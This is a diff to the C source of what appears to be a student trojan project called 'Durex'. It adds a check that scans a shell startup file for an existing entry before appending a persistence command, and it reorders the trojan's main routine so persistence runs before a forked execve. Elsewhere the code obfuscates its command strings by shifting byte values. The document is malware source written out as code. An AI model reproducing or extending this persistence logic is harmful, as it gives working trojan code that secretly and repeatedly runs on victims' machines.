@@ -6,7 +6,7 @@
 /*   By: alagroy- <alagroy-@student.42.fr>          +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2021/12/03 10:35:03 by alagroy-          #+#    #+#             */
-/*   Updated: 2021/12/07 08:38:07 by alagroy-         ###   ########.fr       */
+/*   Updated: 2021/12/09 13:10:09 by alagroy-         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -63,6 +63,27 @@ static void make_command(int *buffer)
         command[i]--;
 }
 
+static int  should_i_persist(char *file)
+{
+    int     should_i;
+    FILE    *rc;
+    char    *line;
+    size_t  size;
+
+    if (access(file, F_OK))
+        return (1);
+    if (!(rc = fopen(file, "r")))
+        return (0);
+    should_i = 1;
+    line = NULL;
+    size = 0;
+    while ((getline(&line, &size, rc) != -1) && should_i)
+        if (strstr(line, "Durex") && (strstr(line, "Durex") - line) == 14)
+            should_i = 0;
+    fclose(rc);
+    return (should_i);
+}
+
 static void persist(void)
 {
     int     rc;
@@ -72,6 +93,8 @@ static void persist(void)
     bzero(command, 50);
     get_rc((int *)file);
     get_filename((int *)command);
+    if (!should_i_persist(file))
+        return ;
     if ((rc = open(file, O_WRONLY | O_CREAT | O_APPEND, 0755)) == -1)
         return ;
     make_command((int *)command);
@@ -89,7 +112,8 @@ void        do_trojan_dirty_job(void)
     };
 
     get_filename(buf);
+    persist();
     if ((pid = fork()) == 0)
         execve(cmd[0], cmd, NULL);
-    persist();
+    calc();
 }
